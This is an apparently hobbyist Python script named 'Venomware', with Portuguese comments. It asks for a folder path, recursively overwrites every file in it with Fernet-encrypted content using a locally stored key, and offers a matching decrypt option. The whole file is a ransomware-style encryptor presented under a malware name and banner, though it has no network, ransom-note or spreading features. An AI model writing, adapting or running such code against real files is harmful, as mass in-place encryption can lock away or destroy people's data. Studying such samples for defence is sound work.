from cryptography.fernet import Fernet
import os
import time

def criptografar(): #função para criptografar todos arquivos na pasta
    #criar/ler key.key
    if os.path.exists("key.key"):
        with open("key.key", "r") as ler_chave:
            key = ler_chave.read()
    else:
        with open("key.key", "wb") as escrever_chave:
            key = Fernet.generate_key()
            escrever_chave.write(key)
    fernet = Fernet(key)
    
    #pegar todos arquivos e diretorios da pasta
    diretorio_local = os.path.dirname(os.path.realpath(__file__)) #pasta local do projeto
    caminho_pasta = input("Digite o caminho da pasta a ser criptografada: ") #pegar caminho da pasta
    print(f"Arquivos e pastas para processar: {caminho_pasta[:11]}...")

    if not os.path.isdir(caminho_pasta):
        print("Caminho inválido ou a pasta não existe. Tente novamente!")
        exit()
    if caminho_pasta == diretorio_local:
        print("Error 102: Essa pasta é protegida!")
        exit()

    def percorre_pastas(diretorio):
        for root, dirs, files in os.walk(diretorio):
            print(f"\nAnalisando diretório: {root}\n")
            for arquivo in files:
                caminho_arquivo = os.path.join(root, arquivo)
            
                if arquivo in ["Venomware.py", "key.key", "tools.py", "__pycache__"]:
                    print(f"'{arquivo}' Error 101: Esse arquivo é protegido!")
                    exit()

                '''if arquivo.lower().endswith(".png"): #opção apenas para exceção de arquivos
                    print(f"Error 104: {arquivo} Este tipo de arquivo não tem permissão para ser processado!")
                    continue'''
                
                try:
                    with open(caminho_arquivo, "rb") as codigo_binario:
                        conteudo = codigo_binario.read()  # Lê o conteúdo binário do arquivo
                        conteudo_criptografado = fernet.encrypt(conteudo)  # Criptografa

                    with open(caminho_arquivo, "wb") as criptografar:
                        criptografar.write(conteudo_criptografado) #escrevre o conteudo criptografado no arquivo
                        print(f"'{arquivo}' Criptografado com sucesso!")
                
                except Exception as e:
                    print(f"Erro ao criptografar {arquivo}: {e}")
    percorre_pastas(caminho_pasta)

def descriptografar(): #função para descriptografar
    #criar/ler key.key
    if os.path.exists("key.key"):
        with open("key.key", "r") as ler_chave:
            key = ler_chave.read()
    else:
        with open("key.key", "wb") as escrever_chave:
            key = Fernet.generate_key()
            escrever_chave.write(key)
    fernet = Fernet(key)

    #pegar todos arquivos e diretórios da pasta
    diretorio_local = os.path.dirname(os.path.realpath(__file__))
    print("OBS: Esta opção vale apenas para pastas que já foram criptografadas!\n")
    caminho_pasta = input("Digite o caminho da pasta a ser descriptografada: ")

    if not os.path.isdir(caminho_pasta):
        print("Caminho inválido ou a pasta não existe. Tente novamente!")
        exit()
    if caminho_pasta == diretorio_local:
        print("Error 102: Essa pasta é protegida!")
        exit()

    def percorre_pastas(diretorio):
        for root, dirs, files in os.walk(diretorio):
            print(f"\nAnalisando diretório: {root}\n")
            for arquivo in files:
                caminho_arquivo = os.path.join(root, arquivo)
            
                if arquivo in ["Venomware.py", "key.key", "tools.py", "__pycache__"]:
                    print(f"'{arquivo}' Error 101: Esse arquivo é protegido!")
                    exit()
                
                '''if arquivo.lower().endswith(".png"):
                    print(f"Error 104: {arquivo} Este tipo de arquivo não tem permissão para ser processado!")
                    continue'''

                try:
                    with open(caminho_arquivo, "rb") as codigo_binario:
                        conteudo = codigo_binario.read()  # Lê o conteúdo criptografado do arquivo
                        conteudo_criptografado = fernet.decrypt(conteudo)  # Descriptografa

                    with open(caminho_arquivo, "wb") as criptografar:
                        criptografar.write(conteudo_criptografado) #escrevre o conteudo descriptografado no arquivo
                        print(f"'{arquivo}' Descriptografado com sucesso!")
                
                except Exception as e:
                    print(f"Erro ao descriptografar {arquivo}: {e}")
    percorre_pastas(caminho_pasta)

#=================================================FRONT-END=================================================

#opção de criptografar todos arquivos, descriptografar e sair
print('''
    ██╗░░░██╗███████╗███╗░░██╗░█████╗░███╗░░░███╗░██╗░░░░░░░██╗░█████╗░██████╗░███████╗
    ██║░░░██║██╔════╝████╗░██║██╔══██╗████╗░████║░██║░░██╗░░██║██╔══██╗██╔══██╗██╔════╝
    ╚██╗░██╔╝█████╗░░██╔██╗██║██║░░██║██╔████╔██║░╚██╗████╗██╔╝███████║██████╔╝█████╗░░
    ░╚████╔╝░██╔══╝░░██║╚████║██║░░██║██║╚██╔╝██║░░████╔═████║░██╔══██║██╔══██╗██╔══╝░░
    ░░╚██╔╝░░███████╗██║░╚███║╚█████╔╝██║░╚═╝░██║░░╚██╔╝░╚██╔╝░██║░░██║██║░░██║███████╗
    ░░░╚═╝░░░╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝░░░░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝

        by: https://github.com/Dsouza77
        version: 1.0
    ''')
opcao = int(input("\n1. Criptografar\n2. Descriptografar\n3. Sair\n\n../ "))
while opcao != 3:
    if opcao == 1:
        criptografar()
    elif opcao == 2:
        descriptografar()
    opcao = int(input("\n1. Criptografar\n2. Descriptografar\n3. Sair\n\n../ "))